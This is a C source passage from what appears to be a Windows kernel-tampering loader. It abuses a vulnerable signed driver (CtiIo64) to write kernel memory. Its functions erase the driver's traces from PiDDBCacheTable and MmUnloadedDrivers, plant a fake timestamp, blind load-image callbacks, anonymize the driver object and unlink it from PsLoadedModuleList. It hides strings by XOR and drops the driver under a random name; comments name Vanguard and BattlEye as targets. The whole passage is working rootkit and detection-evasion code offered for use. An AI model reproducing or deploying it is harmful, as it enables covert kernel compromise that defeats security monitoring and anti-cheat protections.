     +0x20 DriverName.Buffer   (UINT64 kVA)


     +0x28 TimeDateStamp       (ULONG)   */


static void Pk_Walk(UINT64 nodeKA, UINT64 tableKA, ULONG ts, int d){


    if(!nodeKA||nodeKA==tableKA||d>64) return;


    BYTE e[0x40]={0};


    if(!BYOVD_ReadVA(s_sysCR3,nodeKA,e,sizeof(e))) return;


    UINT64 left =*(UINT64*)(e+0x00)&~7ULL;


    UINT64 right=*(UINT64*)(e+0x08)&~7ULL;


    USHORT nLen =*(USHORT*)(e+0x18);


    UINT64 nBuf =*(UINT64*)(e+0x20);


    ULONG  nTs  =*(ULONG* )(e+0x28);


    if(nTs==ts && nLen>0 && nLen<=64 && nBuf){
        WCHAR nm[40]={0};
        BYOVD_ReadVA(s_sysCR3,nBuf,nm,(ULONG)(nLen<78?nLen:78));
        /* XOR-decoded comparison to avoid plaintext "CtiIo" in binary */
        { static const UCHAR _ck[]={0x1F,0x28,0x35,0x15,0x33}; /* CtiIo ^ 0x5C */
          WCHAR _cn[6]; for(int _k=0;_k<5;_k++) _cn[_k]=(WCHAR)(_ck[_k]^0x5Cu); _cn[5]=0;
          if(_wcsnicmp(nm,_cn,5)==0){
            BYOVD_LogFmt("Pk_Walk: MATCH at nodeKA=0x%I64X, wiping PiDDB entry", nodeKA);

            /* Step 1: zero the UNICODE_STRING buffer in kernel pool
             * (the string "CtiIo64.sys" lives at nBuf — wipe it before clearing pointer)
             * Use nLen as byte count; cap at 128 bytes for safety. */
            if(nBuf && nLen <= 128){
                BYTE kzero[128]={0};
                BYOVD_WriteVA(s_sysCR3, nBuf, kzero, (ULONG)nLen);
            }

            /* Step 2: zero name fields in the PiDDB node */
            ULONG z32=0; USHORT z16=0; UINT64 z64=0;
            BYOVD_WriteVA(s_sysCR3,nodeKA+0x18,&z16,2); /* Length    */
            BYOVD_WriteVA(s_sysCR3,nodeKA+0x1A,&z16,2); /* MaxLength */
            BYOVD_WriteVA(s_sysCR3,nodeKA+0x20,&z64,8); /* Buffer    */

            /* Step 3: replace timestamp with a plausible Windows driver stamp
             * instead of writing zero (a zero-timestamp node is an anomaly
             * detectable by AC scanners iterating the full AVL tree). */
            ULONG fakeTs = 0x5E51BF00UL; /* plausible MSFT driver timestamp */
            BYOVD_WriteVA(s_sysCR3,nodeKA+0x28,&fakeTs,4);

            return;
        }
        } /* end XOR block */
    }
    Pk_Walk(left, tableKA,ts,d+1);
    Pk_Walk(right,tableKA,ts,d+1);
}





static void CleanPiDDB(void){
    /* VM_START removed: SecureEngineSDK64.lib without Themida applied may
     * install incompatible SEH handlers or call TerminateProcess, bypassing
     * our outer __try/__except. Replaced with direct SEH guard. */
    __try {

    BYOVD_Log("PDB: A - calling Pk_CtiDrvTS");
    ULONG ts=Pk_CtiDrvTS();
    BYOVD_LogFmt("PDB: B - ts=0x%lX sysCR3=0x%I64X", ts, s_sysCR3);

    if(!ts){ DEBUG_ERROR("PDB: no timestamp"); goto _cpiddb_end; }


    if(!s_sysCR3){ DEBUG_ERROR("PDB: s_sysCR3 is zero"); goto _cpiddb_end; }

    BYOVD_Log("PDB: C - calling Pk_ModBase");
    char _nk[14]; _DecNtk(_nk);
    UINT64 kBase=Pk_ModBase(_nk);
    BYOVD_LogFmt("PDB: D - kBase=0x%I64X", kBase);
    if(!kBase){ DEBUG_ERROR("PDB: ntoskrnl.exe not found"); goto _cpiddb_end; }


    WCHAR path[MAX_PATH]; GetSystemDirectoryW(path,MAX_PATH);
    WCHAR _nkw[15]; _DecNtkW(_nkw);
    wcscat_s(path,MAX_PATH,_nkw);


    BYOVD_Log("PDB: E - calling Pk_MapPE");
    DWORD imgSz=0; BYTE*img=Pk_MapPE(path,&imgSz);
    BYOVD_LogFmt("PDB: F - img=%p imgSz=0x%lX", (void*)img, imgSz);
    if(!img){ DEBUG_ERROR("PDB: Pk_MapPE failed"); goto _cpiddb_end; }


    static const BYTE P[]={0x48,0x8D,0x0D,0,0,0,0,0xE8,0,0,0,0,0x3D,0,0,0,0,0x0F,0x84};
    static const char M[]="xxx????x????x????xx";

    BYOVD_Log("PDB: G - calling Pk_Scan");
    ULONG rva = Pk_Scan(img, imgSz, P, M, sizeof(P));
    LONG disp = (rva) ? *(LONG*)(img + rva + 3) : 0;

    /* ── Win11 24H2 fallback pattern for PiDDBCacheTable ─────────────────
     * The primary pattern may be compiled differently on newer builds.
     * This second pattern targets MiLookupDataTableEntry which always
     * references PiDDBCacheTable with a RIP-relative LEA rax. */
    if(!rva) {
        static const BYTE P2[]={0x48,0x8D,0x05,0,0,0,0,0x48,0x8B,0xF8};
        static const char M2[]="xxx????xxx";
        BYOVD_Log("PDB: G2 - trying Win11 24H2 fallback pattern");
        rva = Pk_Scan(img, imgSz, P2, M2, sizeof(P2));
        if(rva) {
            /* LEA rax,[rip+disp32]; MOV rdi,rax */
            disp = *(LONG*)(img + rva + 3);
            BYOVD_LogFmt("PDB: G2 fallback hit rva=0x%lX disp=0x%lX", rva, (ULONG)disp);
        }
    }
    SeraphVFree(img);
    BYOVD_LogFmt("PDB: H - rva=0x%lX disp=0x%lX", rva, (ULONG)disp);
    if(!rva) goto _cpiddb_end;


    UINT64 tableKA=kBase+rva+7+(LONGLONG)disp;
    UINT64 root=0; BYOVD_ReadVA(s_sysCR3,tableKA+0x08,&root,8);
    root&=~7ULL;
    BYOVD_LogFmt("PDB: I - tableKA=0x%I64X root=0x%I64X", tableKA, root);
    if(!root||root==tableKA) goto _cpiddb_end;
    BYOVD_Log("PDB: J - calling Pk_Walk");
    Pk_Walk(root,tableKA,ts,0);
    BYOVD_Log("PDB: K - Pk_Walk done");


_cpiddb_end:;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        char _eb[80];
        wsprintfA(_eb,"PDB: EXCEPTION 0x%08lX",(unsigned long)GetExceptionCode());
        BYOVD_Log(_eb);
    }
    BYOVD_Log("PDB: DONE");
}





/* Zero out the most-recent LnvMSRIO entry in MmUnloadedDrivers[64].


   Called BEFORE NtUnloadDriver returns Ã¢â‚¬â€ while device handle is still alive. */


static void CleanMmUnloadedDrivers(void){


    VM_START


    if(!s_sysCR3) goto _cmud_end;


    UINT64 kBase;
    { char _nk2[14]; _DecNtk(_nk2);
    kBase=Pk_ModBase(_nk2); if(!kBase) goto _cmud_end; }


    WCHAR path[MAX_PATH]; GetSystemDirectoryW(path,MAX_PATH);


    { WCHAR _nkw2[15]; _DecNtkW(_nkw2);
    wcscat_s(path,MAX_PATH,_nkw2); }


    DWORD imgSz=0; BYTE*img=Pk_MapPE(path,&imgSz); if(!img) goto _cmud_end;


    /* Pattern pointing to MmUnloadedDrivers (array of UNLOADED_DRIVERS[64]) */


    static const BYTE P[]={0x4C,0x8B,0,0,0,0,0,0x4C,0x8B,0xC9,0x4D,0x8B,0x31};


    static const char M[]="xx?????xxxxxx";


    ULONG rva=Pk_Scan(img,imgSz,P,M,sizeof(P));


    LONG disp=(rva)?*(LONG*)(img+rva+3):0;


    SeraphVFree(img);


    if(!rva) goto _cmud_end;


    /* The instruction is MOV r8,[rip+disp32] at rva; next instr at rva+7 */


    UINT64 udVarKA=kBase+rva+7+(LONGLONG)disp; /* kVA of MmUnloadedDrivers ptr */


    UINT64 udArr=0; BYOVD_ReadVA(s_sysCR3,udVarKA,&udArr,8); if(!udArr) goto _cmud_end;


    /* UNLOADED_DRIVERS entry: [Length:2][MaxLen:2][pad:4][Buffer:8][Start:8][End:8][CurrentTime:8] = 0x28 bytes */


    for(int i=0;i<64;i++){


        UINT64 entKA=udArr+(UINT64)i*0x28;


        USHORT nLen=0; BYOVD_ReadVA(s_sysCR3,entKA,&nLen,2);


        if(!nLen||nLen>64) continue;


        UINT64 nBuf=0; BYOVD_ReadVA(s_sysCR3,entKA+0x08,&nBuf,8);


        if(!nBuf) continue;


        WCHAR nm[32]={0}; BYOVD_ReadVA(s_sysCR3,nBuf,nm,min(nLen,62));


        /* XOR-decoded comparison */
        { static const UCHAR _ck2[]={0x34,0x03,0x1E,0x3E,0x18};
          WCHAR _cn2[6]; for(int _k=0;_k<5;_k++) _cn2[_k]=(WCHAR)(_ck2[_k]^0x77u); _cn2[5]=0;
          if(_wcsnicmp(nm,_cn2,5)==0){
            BYOVD_LogFmt("MUD: MATCH at entry %I64X, zeroing 0x28 bytes", entKA);


            BYTE z[0x28]={0}; BYOVD_WriteVA(s_sysCR3,entKA,z,0x28); break;


        }
        } /* end XOR block */


    }


_cmud_end:
    VM_END


}





/* Ã¢â€â‚¬Ã¢â€â‚¬ Driver drop + NtLoadDriver Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */



/* ── PsLoadedModuleList export resolver ─────────────────────────────────── */
static BOOL Pk_FindExport(const BYTE *img, DWORD imgSz, const char *symName, DWORD *outRVA){
    if(!img||imgSz<0x200) return FALSE;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)img;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(img+dos->e_lfanew);
    if(nt->Signature!=IMAGE_NT_SIGNATURE) return FALSE;
    DWORD expRVA=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(!expRVA||expRVA+sizeof(IMAGE_EXPORT_DIRECTORY)>imgSz) return FALSE;
    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)(img+expRVA);
    /* Bounds-check every dereference — corrupt PE / out-of-image RVAs would AV. */
    if ((UINT64)exp->AddressOfNames + (UINT64)exp->NumberOfNames * 4 > imgSz) return FALSE;
    if ((UINT64)exp->AddressOfFunctions + (UINT64)exp->NumberOfFunctions * 4 > imgSz) return FALSE;
    if ((UINT64)exp->AddressOfNameOrdinals + (UINT64)exp->NumberOfNames * 2 > imgSz) return FALSE;
    DWORD *names=(DWORD*)(img+exp->AddressOfNames);
    DWORD *funcs=(DWORD*)(img+exp->AddressOfFunctions);
    WORD  *ords =(WORD* )(img+exp->AddressOfNameOrdinals);
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        if(names[i]>=imgSz) continue;
        if(ords[i]>=exp->NumberOfFunctions) continue;
        if(_stricmp((char*)(img+names[i]),symName)==0){
            *outRVA=funcs[ords[i]]; return TRUE;
        }
    }
    return FALSE;
}

/* ── Silence PspLoadImageNotifyRoutine callbacks ──────────────────────────
 * Temporarily NULLs all registered load-image notify routines in the kernel
 * before NtLoadDriver fires, then restores them immediately after.
 * This prevents Vanguard/BE kernel callbacks from seeing our driver name and
 * base address at load time.
 *
 * Layout (Win10+): PspLoadImageNotifyRoutine is an array of 64 EX_CALLBACK_ROUTINE_BLOCK*
 * pointers. Each is an ExCallbackObject pointer with bit-0 as a valid flag.
 * Pattern: lea rax,[rip+PspLoadImageNotifyRoutine]; on Windows 10/11 this is
 * usually reachable from PsSetLoadImageNotifyRoutineEx (export). */
#define SILN_MAX_CBS 64
typedef struct { UINT64 addr; UINT64 saved; } _SILN_ENTRY;
static _SILN_ENTRY s_silnSaved[SILN_MAX_CBS];
static int s_silnCount = 0;
static UINT64 s_silnArrKA = 0;

static void _FindPspLoadImageNotifyArray(BYTE *img, DWORD imgSz, UINT64 kBase) {
    if(s_silnArrKA) return; /* already found */
    /* Pattern: PsSetLoadImageNotifyRoutineEx -> LEA rax,[rip+PspLoadImageNotifyRoutine]
     * The function is exported — find it via export table then scan first 0x80 bytes
     * for 48 8D 05 ?? ?? ?? ?? (LEA rax, [rip+disp32]) */
    DWORD fnRVA = 0;
    /* XOR-decoded "PsSetLoadImageNotifyRoutineEx" */
    { static const char _enc[]={0x1B,0x38,0x1F,0x2E,0x3F,0x07,0x24,0x2A,0x37,0x38,0x37,0x2E,0x17,0x24,0x3F,0x3C,0x2D,0x3D,0x24,0x07,0x1D,0x24,0x3E,0x3F,0x2D,0x24,0x15,0x3C};
      char _dec[29]; for(int _j=0;_j<28;_j++) _dec[_j]=_enc[_j]^0x4B; _dec[28]=0;
      Pk_FindExport(img,imgSz,_dec,&fnRVA);
    }
    if(!fnRVA) {
        BYOVD_Log("SILN: PsSetLoadImageNotifyRoutineEx not found, skipping");
        return;
    }
    BYTE *fn = img + fnRVA;
    DWORD scanLen = (imgSz - fnRVA > 0x100) ? 0x100 : (imgSz - fnRVA);
    for(DWORD i = 0; i + 7 <= scanLen; i++) {
        /* LEA rax,[rip+disp32] = 48 8D 05 xx xx xx xx */
        if(fn[i]==0x48 && fn[i+1]==0x8D && fn[i+2]==0x05) {
            LONG disp = *(LONG*)(fn + i + 3);
            UINT64 arrKA = kBase + fnRVA + i + 7 + (LONGLONG)disp;
            /* Sanity: must be a canonical kernel VA */
            if((arrKA >> 32) >= 0xFFFF0000ULL || (arrKA >> 32) == 0) continue;
            s_silnArrKA = arrKA;
            BYOVD_LogFmt("SILN: PspLoadImageNotifyRoutine @ KA=0x%I64X", arrKA);
            return;
        }
    }
    BYOVD_Log("SILN: LEA pattern not found in PsSetLoadImageNotifyRoutineEx");
}

/* Call before NtLoadDriver to blind all load-image notify callbacks */
static void SilenceLoadImageCallbacks(void) {
    s_silnCount = 0;
    if(!s_sysCR3 || !s_silnArrKA) return;
    UINT64 z64 = 0;
    for(int i = 0; i < SILN_MAX_CBS; i++) {
        UINT64 cb = 0;
        if(!BYOVD_ReadVA(s_sysCR3, s_silnArrKA + (UINT64)i * 8, &cb, 8)) break;
        if(!cb) continue;
        /* Save and NULL the slot */
        s_silnSaved[s_silnCount].addr  = s_silnArrKA + (UINT64)i * 8;
        s_silnSaved[s_silnCount].saved = cb;
        s_silnCount++;
        BYOVD_WriteVA(s_sysCR3, s_silnArrKA + (UINT64)i * 8, &z64, 8);
    }
    BYOVD_LogFmt("SILN: silenced %d load-image callbacks", s_silnCount);
}

/* Call immediately after NtLoadDriver to restore all callbacks */
static void RestoreLoadImageCallbacks(void) {
    for(int i = 0; i < s_silnCount; i++) {
        BYOVD_WriteVA(s_sysCR3, s_silnSaved[i].addr, &s_silnSaved[i].saved, 8);
    }
    BYOVD_LogFmt("SILN: restored %d load-image callbacks", s_silnCount);
    s_silnCount = 0;
}

/* ── Hide DriverObject from Object Manager namespace ─────────────────────
 * After NtLoadDriver, the kernel creates a DriverObject at \Driver\<svcName>.
 * We find it by walking the \Driver\ object directory via PA, then zero the
 * Name field in OBJECT_HEADER_NAME_INFO so it becomes anonymous (invisible to
 * NtQueryDirectoryObject / ObEnumerateObjectsByType enumeration).
 *
 * OBJECT_HEADER layout (Win10 x64):
 *   -0x28 OBJECT_HEADER_NAME_INFO.Directory  (UINT64)
 *   -0x20 OBJECT_HEADER_NAME_INFO.Name.Len   (USHORT)
 *   -0x1E OBJECT_HEADER_NAME_INFO.Name.MaxLen (USHORT)
 *   -0x18 OBJECT_HEADER_NAME_INFO.Name.Buffer (UINT64 kVA)
 *   -0x10 OBJECT_HEADER.PointerCount          (LONG64)
 *   ... etc.
 * We locate the DriverObject by scanning OBJECT_DIRECTORY entries in \Driver\.
 * \Driver\ directory object PA is found via ObGetObjectType + OBJECT_DIRECTORY walk. */
static void HideDriverObject(void) {
    if(!s_sysCR3 || !s_svcName[0]) return;
    /* Strategy: scan PsLoadedModuleList (already walked) for our entry, then
     * navigate DRIVER_OBJECT.DriverSection->... No — simpler approach:
     * The DriverObject pointer is stored in DRIVER_OBJECT. We find it by
     * reading the LDR_DATA_TABLE_ENTRY.DllBase (ImageBase) from the
     * PsLoadedModuleList entry BEFORE HideByovdDriver unlinks it.
     * Instead, we use a second approach: read DriverObject directly from the
     * CtiIo device handle's file object.
     *
     * Simplest reliable method: use NtQueryObject on our handle to get the
     * kernel address of the FILE_OBJECT, then read FILE_OBJECT->DeviceObject
     * -> DeviceObject->DriverObject -> walk OBJECT_HEADER_NAME_INFO.
     */
    __try {
        /* Get kernel address of our file object via NtQueryObject TYPE_INFO */
        /* We can't easily get the kernel VA of the object from usermode.
         * Instead: walk PsLoadedModuleList for our entry (before unlink)
         * to get the driver's ImageBase, then find the DRIVER_OBJECT by
         * scanning pool memory — too complex.
         *
         * Practical approach: use the device's GUID svcName to find the
         * OBJECT_HEADER_NAME_INFO from the \Driver directory. We need the
         * directory object's kernel address. Pattern scan for ObpRootDirectoryObject
         * export in ntoskrnl and walk the directory bucket array.
         */
        UINT64 kBase;
        { char _nk4[14]; _DecNtk(_nk4);
          kBase = Pk_ModBase(_nk4); if(!kBase) return; }

        WCHAR path[MAX_PATH]; GetSystemDirectoryW(path, MAX_PATH);
        { WCHAR _nkw4[15]; _DecNtkW(_nkw4); wcscat_s(path, MAX_PATH, _nkw4); }
        DWORD imgSz = 0;
        BYTE *img = Pk_MapPE(path, &imgSz);
        if(!img) return;

        /* Find ObpRootDirectoryObject export */
        DWORD rootRVA = 0;
        { /* XOR-encoded "ObpRootDirectoryObject" (key=0x4B) */
          static const char _enc[]={0x04,0x29,0x3F,0x1D,0x24,0x24,0x3F,0x16,0x2D,0x25,0x2E,0x24,0x24,0x3F,0x24,0x2B,0x24,0x25,0x3F,0x24,0x22};
          char _dec[22]; for(int _j=0;_j<21;_j++) _dec[_j]=_enc[_j]^0x4B; _dec[21]=0;
          Pk_FindExport(img, imgSz, _dec, &rootRVA);
        }
        if(!rootRVA) {
            SeraphVFree(img);
            BYOVD_Log("HDO: ObpRootDirectoryObject not found, skip");
            return;
        }
        SeraphVFree(img);

        /* Read the root directory pointer (it's a pointer-to-pointer) */
        UINT64 rootDirPtrKA = kBase + rootRVA;
        UINT64 rootDirKA = 0;
        BYOVD_ReadVA(s_sysCR3, rootDirPtrKA, &rootDirKA, 8);
        if(!rootDirKA) { BYOVD_Log("HDO: root dir null"); return; }

        /* OBJECT_DIRECTORY layout: 37 buckets of OBJECT_DIRECTORY_ENTRY* at +0x00.
         * Each OBJECT_DIRECTORY_ENTRY: ChainLink(+0x00 UINT64), Object(+0x08 UINT64), HashValue(+0x10 ULONG) */
        /* Walk root directory to find \Driver bucket */
        UINT64 driverDirKA = 0;
        /* XOR-decoded "Driver" (key=0x11) */
        WCHAR _drvName[8] = {0};
        { static const UCHAR _de[]={0x55,0x63,0x64,0x7A,0x62,0x63};
          for(int _k=0;_k<6;_k++) _drvName[_k]=(WCHAR)(_de[_k]^0x11); _drvName[6]=0; }

        for(int b = 0; b < 37 && !driverDirKA; b++) {
            UINT64 entKA = 0;
            BYOVD_ReadVA(s_sysCR3, rootDirKA + (UINT64)b * 8, &entKA, 8);
            while(entKA && !driverDirKA) {
                UINT64 objKA = 0;
                BYOVD_ReadVA(s_sysCR3, entKA + 0x08, &objKA, 8);
                if(objKA) {
                    /* Read OBJECT_HEADER_NAME_INFO: at objKA - 0x20 */
                    UINT64 nameInfoKA = objKA - 0x20;
                    USHORT nameLen = 0;
                    BYOVD_ReadVA(s_sysCR3, nameInfoKA, &nameLen, 2);
                    if(nameLen > 0 && nameLen <= 32) {
                        UINT64 nameBuf = 0;
                        BYOVD_ReadVA(s_sysCR3, nameInfoKA + 0x08, &nameBuf, 8);
                        if(nameBuf) {
                            WCHAR nm[16]={0};
                            BYOVD_ReadVA(s_sysCR3, nameBuf, nm, (ULONG)(nameLen < 30 ? nameLen : 30));
                            if(_wcsnicmp(nm, _drvName, 6) == 0)
                                driverDirKA = objKA;
                        }
                    }
                }
                UINT64 next = 0;
                BYOVD_ReadVA(s_sysCR3, entKA, &next, 8);
                entKA = next;
            }
        }
        if(!driverDirKA) { BYOVD_Log("HDO: \\Driver\\ dir not found"); return; }
        BYOVD_LogFmt("HDO: \\Driver\\ dir at KA=0x%I64X", driverDirKA);

        /* Walk \Driver\ directory to find our svcName object */
        /* Convert svcName to compare: our service name is all upper-case hex GUID partial */
        for(int b = 0; b < 37; b++) {
            UINT64 entKA = 0;
            BYOVD_ReadVA(s_sysCR3, driverDirKA + (UINT64)b * 8, &entKA, 8);
            while(entKA) {
                UINT64 objKA = 0;
                BYOVD_ReadVA(s_sysCR3, entKA + 0x08, &objKA, 8);
                if(objKA) {
                    UINT64 nameInfoKA = objKA - 0x20;
                    USHORT nameLen = 0;
                    BYOVD_ReadVA(s_sysCR3, nameInfoKA, &nameLen, 2);
                    UINT64 nameBuf = 0;
                    BYOVD_ReadVA(s_sysCR3, nameInfoKA + 0x08, &nameBuf, 8);
                    if(nameBuf && nameLen > 0 && nameLen <= 64) {
                        WCHAR nm[36]={0};
                        BYOVD_ReadVA(s_sysCR3, nameBuf, nm, (ULONG)(nameLen < 70 ? nameLen : 70));
                        if(_wcsicmp(nm, s_svcName) == 0) {
                            BYOVD_LogFmt("HDO: found DriverObject for %S at KA=0x%I64X, anonymizing", s_svcName, objKA);
                            /* Zero the Name field in OBJECT_HEADER_NAME_INFO */
                            /* First wipe the name buffer in kernel pool */
                            if(nameLen <= 128) {
                                BYTE kz[128] = {0};
                                BYOVD_WriteVA(s_sysCR3, nameBuf, kz, (ULONG)nameLen);
                            }
                            USHORT z16 = 0; UINT64 z64 = 0;
                            BYOVD_WriteVA(s_sysCR3, nameInfoKA,       &z16, 2); /* Length */
                            BYOVD_WriteVA(s_sysCR3, nameInfoKA + 0x02, &z16, 2); /* MaxLength */
                            BYOVD_WriteVA(s_sysCR3, nameInfoKA + 0x08, &z64, 8); /* Buffer */
                            /* Also zero Directory pointer so it's detached from \Driver\ */
                            UINT64 dirPtrKA = objKA - 0x28;
                            BYOVD_WriteVA(s_sysCR3, dirPtrKA, &z64, 8);
                            BYOVD_Log("HDO: DriverObject anonymized");
                            return;
                        }
                    }
                }
                UINT64 next = 0;
                BYOVD_ReadVA(s_sysCR3, entKA, &next, 8);
                entKA = next;
            }
        }
        BYOVD_Log("HDO: DriverObject not found in \\Driver\\ directory");
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        BYOVD_LogFmt("HDO: exception 0x%08lX", (unsigned long)GetExceptionCode());
    }
}

/* DKOM: unlink CtiIo64 from PsLoadedModuleList via Ring-3 physical writes.
 * Primary: export table lookup (PsLoadedModuleList IS exported by ntoskrnl).
 * Fallback: two pattern scans for robustness.
 * Write order: Blink->Flink = Flink, then Flink->Blink = Blink, then self-point.
 * BYOVD_WriteVA does R-M-W on 4KB page => 8-byte aligned writes are atomic. */
static void HideByovdDriver(void){
    VM_START
    if(!s_sysCR3) { goto _hide_exit; }
    UINT64 kBase;
    { char _nk3[14]; _DecNtk(_nk3);
    kBase=Pk_ModBase(_nk3); if(!kBase) { goto _hide_exit; } }
    WCHAR path[MAX_PATH]; GetSystemDirectoryW(path,MAX_PATH);
    { WCHAR _nkw3[15]; _DecNtkW(_nkw3);
    wcscat_s(path,MAX_PATH,_nkw3); }
    DWORD imgSz=0; BYTE *img=Pk_MapPE(path,&imgSz); if(!img) goto _hide_exit;

    UINT64 listHeadKA=0;
    /* Method 1: resolve via export table */
    DWORD listRVA=0;
    /* XOR-decoded "PsLoadedModuleList" (key=0x4B) */
    { static const char _enc3[]={0x1B,0x38,0x07,0x24,0x2A,0x2F,0x2E,0x2F,0x06,0x24,0x2F,0x3E,0x27,0x2E,0x07,0x22,0x38,0x3F,0x00};
      char _dec3[20]; for(int _j=0;_j<18;_j++) _dec3[_j]=_enc3[_j]^0x4B; _dec3[18]=0;
    if(Pk_FindExport(img,imgSz,_dec3,&listRVA)&&listRVA)
        listHeadKA=kBase+listRVA;
    } /* end PsLoadedModuleList XOR block */
    /* Method 2: pattern scan fallback A */
    if(!listHeadKA){
        static const BYTE P1[]={0x48,0x8B,0x1D,0,0,0,0,0x48,0x85,0xDB};
        static const char M1[]="xxx????xxx";
        ULONG r=Pk_Scan(img,imgSz,P1,M1,sizeof(P1));
        if(r){ LONG d=*(LONG*)(img+r+3); listHeadKA=kBase+r+7+(LONGLONG)d; }
    }
    /* Method 3: pattern scan fallback B */
    if(!listHeadKA){
        static const BYTE P2[]={0x4C,0x8D,0x25,0,0,0,0,0xEB};
        static const char M2[]="xxx????x";
        ULONG r=Pk_Scan(img,imgSz,P2,M2,sizeof(P2));
        if(r){ LONG d=*(LONG*)(img+r+3); listHeadKA=kBase+r+7+(LONGLONG)d; }
    }
    SeraphVFree(img);
    if(!listHeadKA){ BYOVD_LogErr("HDR: module list head not found"); goto _hide_exit; }

    /* Walk list physically
     * LDR_DATA_TABLE_ENTRY layout (Win10 22H2 x64):
     *   +0x00 InLoadOrderLinks.Flink  (UINT64)
     *   +0x08 InLoadOrderLinks.Blink  (UINT64)
     *   +0x48 BaseDllName             (UNICODE_STRING 0x10b)
     *   +0x58 FullDllName             (UNICODE_STRING 0x10b) */
    UINT64 cur=0;
    BYOVD_ReadVA(s_sysCR3,listHeadKA,&cur,8);
    for(int g=0;cur&&cur!=listHeadKA&&g<512;g++){
        UINT64 entry=cur;
        USHORT nLen=0; UINT64 nBuf=0;
        BYOVD_ReadVA(s_sysCR3,entry+0x48,&nLen,2);
        BYOVD_ReadVA(s_sysCR3,entry+0x50,&nBuf,8);
        if(nBuf&&nLen>0&&nLen<=64){
            WCHAR nm[36]={0};
            BYOVD_ReadVA(s_sysCR3,nBuf,nm,(ULONG)(nLen<70?nLen:70));
            /* XOR-decoded comparison */
            { static const UCHAR _ck3[]={0xC8,0xFF,0xE2,0xC2,0xE4};
              WCHAR _cn3[6]; for(int _k=0;_k<5;_k++) _cn3[_k]=(WCHAR)(_ck3[_k]^0x8Bu); _cn3[5]=0;
              if(_wcsnicmp(nm,_cn3,5)==0){
                BYOVD_LogFmt("HDR: MATCH at entry=0x%I64X, unlinking from PsLoadedModuleList", entry);
                UINT64 flink=0,blink=0;
                BYOVD_ReadVA(s_sysCR3,entry+0x00,&flink,8);
                BYOVD_ReadVA(s_sysCR3,entry+0x08,&blink,8);
                /* Validate flink/blink before writing — stale read returning 0
                 * would corrupt CR3=0x0 / 0x8 → BSOD. */
                if (!flink || !blink || flink == entry || blink == entry) {
                    BYOVD_LogErr("HDR: invalid flink/blink, abort unlink");
                    goto _hide_exit;
                }
                BYOVD_WriteVA(s_sysCR3,blink,    &flink,8); /* prev->Flink=next */
                BYOVD_WriteVA(s_sysCR3,flink+0x08,&blink,8); /* next->Blink=prev */
                BYOVD_WriteVA(s_sysCR3,entry+0x00,&entry,8); /* self-flink */
                BYOVD_WriteVA(s_sysCR3,entry+0x08,&entry,8); /* self-blink */
                UINT64 z64=0; USHORT z16=0;
                BYOVD_WriteVA(s_sysCR3,entry+0x48,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x4A,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x50,&z64,8);
                BYOVD_WriteVA(s_sysCR3,entry+0x58,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x5A,&z16,2);
                BYOVD_WriteVA(s_sysCR3,entry+0x60,&z64,8);
                BYOVD_Log("HDR: driver unlinked from module list");
                goto _hide_exit;
            }
            } /* end XOR block */
        }
        BYOVD_ReadVA(s_sysCR3,cur,&cur,8);
    }
    BYOVD_Log("HDR: driver not in module list (already hidden)");
_hide_exit:
    VM_END
}
static BOOL DropAndLoad(void){


    VM_START


    BOOL ok = FALSE;


    HRSRC hR=FindResourceW(BYOVD_SELF_HMODULE,MAKEINTRESOURCEW(IDR_CTIIO64),RT_RCDATA);


    if(!hR) {


        DEBUG_ERROR("DL: FindResourceW failed");


        goto _dal_end;


    }


    HGLOBAL hG=LoadResource(BYOVD_SELF_HMODULE,hR);


    LPVOID p=LockResource(hG); DWORD sz=SizeofResource(BYOVD_SELF_HMODULE,hR);


    if(!p||!sz) {


        DEBUG_ERROR("DL: LoadResource/LockResource failed");


        goto _dal_end;


    }





    /* GUID-named .sys in System32\drivers */


    GUID g; CoCreateGuid(&g);


    WCHAR sysDir[MAX_PATH]; GetSystemDirectoryW(sysDir,MAX_PATH);


    wsprintfW(s_sysPath,L"%s\\drivers\\%08X%04X%04X.sys",sysDir,g.Data1,g.Data2,g.Data3);


    wsprintfW(s_svcName,L"%08X%04X%04X",g.Data1,g.Data2,g.Data3);





    /* Write driver to disk */


    {


        char pathA[MAX_PATH]; WideCharToMultiByte(CP_ACP,0,s_sysPath,-1,pathA,MAX_PATH,NULL,NULL);


        BYOVD_LogFmt("DL: drop path = %s", pathA);


    }


    HANDLE hF=CreateFileW(s_sysPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);


    if(hF==INVALID_HANDLE_VALUE) {


        DWORD err = GetLastError();


        DEBUG_ERROR("DL: CreateFileW failed, error=%lu", err);


        BYOVD_LogFmtErr("DL: CreateFileW FAILED error=%lu (0x%08lX) - provavelmente sem admin ou SecureBoot bloqueou", err, err);


        goto _dal_end;


    }


    DWORD w; WriteFile(hF,p,sz,&w,NULL); SysNtClose(hF);


    if(w!=sz){


        DWORD err = GetLastError();


